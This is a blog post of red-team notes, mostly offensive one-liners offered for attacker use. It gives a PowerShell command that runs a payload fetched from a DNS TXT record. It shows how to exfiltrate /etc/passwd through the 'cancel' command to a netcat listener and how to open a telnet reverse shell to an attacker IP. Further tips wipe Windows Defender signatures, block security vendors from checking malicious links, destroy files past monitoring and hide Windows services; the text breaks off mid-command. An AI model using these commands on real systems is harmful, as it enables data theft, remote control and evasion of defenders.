---
layout: post
title:  "Red Team Notes"
date:   2020-09-20 16:46:24 +0200
categories: [redteam, R&D]
---

# Windows

## Malicious Payload in DNS Txt
Attacker can put malicious payload in DNS TXT record content of domain. So, watch out for:

```bash
powershell . (nslookup -q=txt some.domain.com)[-1]
```


---
## Curl with cancel
Except curl, wget and nc commands, attacker can use ‘cancel’ to exfiltrate data 

```bash
Attacker machine:
nc -nlvp 18110 

Victim machine:
cancel -u "$(cat /etc/passwd | base64)" -h <ip>:<port>
```

---

---

## RCE without python Bash 
After successful RCE inside container, but the container doesn't have BASH, Netcat, Python, or any of your normal revshell helpers, attacker can also use telnet

```bash
mkfifo /tmp/cth; sh -i 2>&1 </tmp/cth | telnet <atkIP> 8443 >/tmp/cth; rm /tmp/cth
```

---

---

Example: using explorer.exe for code execution

```powershell

explorer.exe /root,"C:\Windows\System32\calc.exe"
```

---

## Windows Defender signature removoal  
A bit messy, but if Windows Defender is causing you a big headache, rather than disabling it (which alerts the user), you should just neuter it by deleting all the signatures:

```powershell
"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

---

---

Red Teamers: those pesky security vendors--like VirusTotal, PaloAlto, and Fortinet--will poke at your infrastructure and evaluate your malicious links, potentially flagging them. Use this .htaccess file to block the common ones outright: https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10

---

---
## Delete file with shred
Just deleting files is not enough. To really remove them, use shred.

```bash
shred -z cthulhu.txt
```

If shred command is in monitoring for generating alert, the shred command may be caught, you can do this:

```bash
FN=cthulhu.txt; dd bs=1k count="du -sk \\"${FN}\\" | cut -f1" if=/dev/urandom >"${FN}"; rm -f "${FN}"
```

---

---
## Hiding Windows services
This is a really nasty tip: Windows' sc.exe allows you to manually assign service permissions with SDDL syntax. This allows you to essentially make your service invisible unless defenders already know the service name.

Services.exe, Get-Service, sc.exe, all of these fail.

Hiding Windows services:

```powershell
sc sdset evilsvc "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLO